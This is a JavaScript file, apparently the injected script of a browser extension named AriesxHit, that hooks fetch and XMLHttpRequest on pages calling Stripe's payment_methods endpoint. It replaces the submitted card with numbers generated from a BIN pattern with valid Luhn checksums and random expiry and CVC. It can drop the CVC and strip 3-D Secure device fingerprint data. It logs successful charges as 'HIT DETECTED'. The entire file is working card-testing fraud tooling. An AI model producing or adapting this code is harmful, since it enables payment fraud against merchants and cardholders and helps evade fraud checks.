// ===================================
// BYPASS.JS - Injected into page context
// Intercepts fetch/XHR - NO DEBUGGER POPUP
// ===================================

(function() {
  if (window.__ARIESXHIT_BYPASS_ACTIVE__) return;
  window.__ARIESXHIT_BYPASS_ACTIVE__ = true;

  // State
  let enabled = false;
  let currentBin = '';
  let settings = {
    cvcModifier: 'generate',
    customCvc: '',
    remove3dsFingerprint: true
  };

  // Listen for state updates from content script
  window.addEventListener('message', (e) => {
    if (e.data?.source !== 'ariesxhit-control') return;
    
    if (e.data.type === 'SET_STATE') {
      enabled = e.data.enabled ?? enabled;
      currentBin = e.data.bin ?? currentBin;
      settings = e.data.settings ?? settings;
      console.log('[AriesxHit] State:', { enabled, currentBin });
    }
  });

  // ==================== CARD GENERATOR ====================
  
  function generateCard(bin) {
    if (!bin) return null;
    
    const parts = bin.split('|');
    let pattern = parts[0].replace(/[^0-9xX]/g, '');
    const expMonth = parts[1]?.trim();
    const expYear = parts[2]?.trim();
    const cvvPattern = parts[3]?.trim();

    // Pad to 16
    while (pattern.length < 16) pattern += 'x';

    // Generate number with random digits for x
    let number = '';
    for (let i = 0; i < 16; i++) {
      const c = pattern[i];
      number += (c?.toLowerCase() === 'x') ? Math.floor(Math.random() * 10) : c;
    }

    // Fix Luhn checksum
    const digits = number.split('').map(Number);
    let sum = 0;
    for (let i = 0; i < 15; i++) {
      let d = digits[i];
      if ((15 - i) % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
      sum += d;
    }
    number = number.slice(0, 15) + ((10 - (sum % 10)) % 10);

    // Month
    let month;
    if (expMonth && /^\d{1,2}$/.test(expMonth)) {
      month = expMonth.padStart(2, '0');
    } else {
      month = (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
    }

    // Year
    let year;
    const now = new Date().getFullYear();
    if (expYear && /^\d{2,4}$/.test(expYear)) {
      let y = parseInt(expYear);
      if (y < 100) y += 2000;
      year = (y % 100).toString().padStart(2, '0');
    } else {
      year = ((now + Math.floor(Math.random() * 5) + 1) % 100).toString().padStart(2, '0');
    }

    // CVV
    let cvv;
    switch (settings.cvcModifier) {
      case 'remove': cvv = ''; break;
      case 'custom': cvv = settings.customCvc || '000'; break;
      case 'nothing': cvv = cvvPattern || Math.floor(100 + Math.random() * 900).toString(); break;
      default: cvv = Math.floor(100 + Math.random() * 900).toString();
    }

    return { number, month, year, cvv };
  }

  // ==================== SEND LOG ====================
  
  function sendLog(type, message) {
    window.postMessage({
      source: 'ariesxhit-bypass',
      type: 'LOG',
      logType: type,
      message: message
    }, '*');
  }

  // ==================== MODIFY BODY ====================
  
  function modifyPaymentBody(body, card) {
    const params = new URLSearchParams(body);
    
    // Set card data
    params.set('card[number]', card.number);
    params.set('card[exp_month]', card.month);
    params.set('card[exp_year]', card.year);
    
    // CVC
    if (settings.cvcModifier === 'remove') {
      params.delete('card[cvc]');
    } else if (card.cvv) {
      params.set('card[cvc]', card.cvv);
    }

    // payment_method_data format
    if (params.has('payment_method_data[card][number]') || params.has('payment_method_data[type]')) {
      params.set('payment_method_data[card][number]', card.number);
      params.set('payment_method_data[card][exp_month]', card.month);
      params.set('payment_method_data[card][exp_year]', card.year);
      if (settings.cvcModifier === 'remove') {
        params.delete('payment_method_data[card][cvc]');
      } else if (card.cvv) {
        params.set('payment_method_data[card][cvc]', card.cvv);
      }
    }

    // 3DS bypass
    if (settings.remove3dsFingerprint) {
      for (const [key, value] of params) {
        if (key.includes('three_d_secure') && key.includes('device_data')) {
          try {
            let obj = JSON.parse(atob(decodeURIComponent(value)));
            delete obj.browser_locale; delete obj.timezone; delete obj.user_agent;
            delete obj.screen_width; delete obj.screen_height; delete obj.color_depth;
            params.set(key, encodeURIComponent(btoa(JSON.stringify(obj))));
          } catch (e) {}
        }
      }
    }

    return params.toString();
  }

  // ==================== INTERCEPT FETCH ====================
  
  const originalFetch = window.fetch;
  window.fetch = async function(input, init) {
    const url = typeof input === 'string' ? input : input?.url;
    
    // Only intercept Stripe payment requests when enabled
    if (enabled && currentBin && url?.includes('stripe.com/v1/payment_methods') && init?.method === 'POST' && init?.body) {
      try {
        const card = generateCard(currentBin);
        if (card) {
          // LOG: Trying Card (YELLOW)
          const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
          sendLog('trying', `Trying Card :- ${cardStr}`);

          // Modify body
          init.body = modifyPaymentBody(init.body, card);
        }
      } catch (e) {
        console.error('[AriesxHit] Fetch error:', e);
      }
    }

    // Make request
    const response = await originalFetch.call(this, input, init);

    // Check response for Stripe
    if (url?.includes('stripe.com')) {
      try {
        const clone = response.clone();
        const data = await clone.json();
        
        // LOG: Response
        if (data.error) {
          const code = data.error.decline_code || data.error.code || 'error';
          sendLog('error', `❌ Stripe: ${code}`);
        } else if (data.status === 'succeeded' || data.id) {
          sendLog('success', '✅ Stripe: Success');
          sendLog('success', '🎉 HIT DETECTED!');
        }
      } catch (e) {}
    }

    return response;
  };

  // ==================== INTERCEPT XHR ====================
  
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    this._method = method;
    return originalOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    // Only intercept Stripe payment requests when enabled
    if (enabled && currentBin && this._url?.includes('stripe.com/v1/payment_methods') && this._method === 'POST' && body) {
      try {
        const card = generateCard(currentBin);
        if (card) {
          // LOG: Trying Card (YELLOW)
          const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
          sendLog('trying', `Trying Card :- ${cardStr}`);

          // Modify body
          body = modifyPaymentBody(body, card);
        }
      } catch (e) {
        console.error('[AriesxHit] XHR error:', e);
      }
    }

    // Listen for response
    this.addEventListener('load', function() {
      if (this._url?.includes('stripe.com')) {
        try {
          const data = JSON.parse(this.responseText);
          
          // LOG: Response
          if (data.error) {
            const code = data.error.decline_code || data.error.code || 'error';
            sendLog('error', `❌ Stripe: ${code}`);
          } else if (data.status === 'succeeded' || data.id) {
            sendLog('success', '✅ Stripe: Success');
            sendLog('success', '🎉 HIT DETECTED!');
          }
        } catch (e) {}
      }
    });

    return originalSend.call(this, body);
  };

  console.log('[AriesxHit] Bypass injected - fetch/XHR interception active');
})();
